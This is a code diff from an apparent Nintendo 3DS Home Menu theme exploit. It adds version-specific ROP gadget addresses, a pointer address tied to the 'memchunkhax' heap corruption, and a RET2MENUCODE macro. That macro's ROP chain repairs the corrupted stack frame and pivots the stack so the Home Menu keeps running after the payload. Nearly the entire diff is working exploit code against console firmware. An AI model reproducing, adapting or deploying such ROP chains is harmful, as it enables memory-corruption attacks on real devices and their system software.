@@ -23,6 +23,7 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define POP_R4LR_BXR1 0x0011df68 //"pop {r4, lr}" "bx r1"
 #define ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX 0x001037fc//"ldr r1, [r5, r4, lsl #2]" "ldr r2, [r0]" "ldr r2, [r2, #20]" "blx r2"
 #define POP_R4R8LR_BXR2 0x00133f8c //"pop {r4, r5, r6, r7, r8, lr}" "bx r2"
+#define POP_R4R5R6PC 0x00101b94 //"pop {r4, r5, r6, pc}"
 
 #define CFGIPC_SecureInfoGetRegion 0x00136ea4 //inr0=u8* out
 #else
@@ -31,6 +32,7 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define POP_R4LR_BXR1 0x0011dda4
 #define ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX 0x001037d8
 #define POP_R4R8LR_BXR2 0x00136d5c
+#define POP_R4R5R6PC 0x00101b90
 
 #define CFGIPC_SecureInfoGetRegion 0x00139d0c
 #endif
@@ -59,6 +61,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define svcSleepThread 0x0012b590
 
 #define GXLOW_CMD4 0x0014ac9c
+
+#define ORIGINALOBJPTR_LOADADR (0x0031382c+8) //The ptr stored here is the ptr stored in the saved r4 value in the stackframe, which was overwritten by memchunkhax.
 #endif
 
 #if SYSVER <= 92 //v9.0-v9.2
@@ -106,6 +110,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define GXLOW_CMD4 0x0014d604
 
 #define NSS_LaunchTitle 0x0020e6a8
+
+#define ORIGINALOBJPTR_LOADADR (0x002f1820+8)
 #endif
 
 #if SYSVER == 94
@@ -130,7 +136,11 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define svcControlMemory 0x00212d88
 
 #define ROP_INITOBJARRAY 0x0020a3a5
+
+#define ORIGINALOBJPTR_LOADADR (0x002f0820+8)
 #endif
+
+#define TARGETOVERWRITE_STACKADR TARGETOVERWRITE_MEMCHUNKADR+12
 
 #define ROP_BXR1 POP_R4LR_BXR1+4
 #define ROP_BXLR ROP_LDR_R0FROMR0+4 //"bx lr"
@@ -192,6 +202,39 @@ ROP_SETLR POP_R2R6PC
 .word 0 @ r6
 .endm
 
+.macro RET2MENUCODE
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word TARGETOVERWRITE_STACKADR @ r0
+
+.word POP_R1PC
+.word ORIGINALOBJPTR_LOADADR @ r1
+
+.word ROP_LDRR1R1_STRR1R0 @ Restore the saved r4 value overwritten by memchunkhax with the original value.
+
+.word POP_R0PC
+.word HEAPBUF + (stackpivot_sploadword - _start) @ r0
+
+.word POP_R1PC
+.word TARGETOVERWRITE_STACKADR @ r1
+
+.word ROP_STR_R1TOR0 @ Write TARGETOVERWRITE_STACKADR to the word which will be popped into sp.
+
+.word POP_R0PC
+.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0
+
+.word POP_R1PC
+.word POP_R4R5R6PC @ r1
+
+.word ROP_STR_R1TOR0 @ Write POP_R4R5R6PC to the word which will be popped into pc.
+
+.word POP_R0PC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
+.word HEAPBUF + (object - _start) @ r0
+
+.word ROP_LOADR4_FROMOBJR0
+.endm
+
 _start:
 
 themeheader:
@@ -208,7 +251,9 @@ object:
 .word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
 
 .space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
+stackpivot_sploadword:
 .word HEAPBUF + (ropstackstart - _start) @ sp
+stackpivot_pcloadword:
 .word ROP_POPPC @ pc
 
 .space ((object + 0x28) - .)
@@ -263,6 +308,10 @@ ropstackstart:
 
 //Overwrite the top-screen framebuffers.
 CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2
+
+#ifdef ENABLE_RET2MENU//Note that when using this Home Menu have the default theme "selected", however Home Menu will still load the themehax when homemenu starts up again later.
+RET2MENUCODE
+#endif
 
 #if NEW3DS==1 //On New3DS the end-address of the GPU-accessible FCRAM area increased, relative to the SYSTEM-memregion end address. Therefore, in order to get the below process to run under memory that's GPU accessible, 0x400000-bytes are allocated here.
 ROP_SETLR POP_R2R6PC
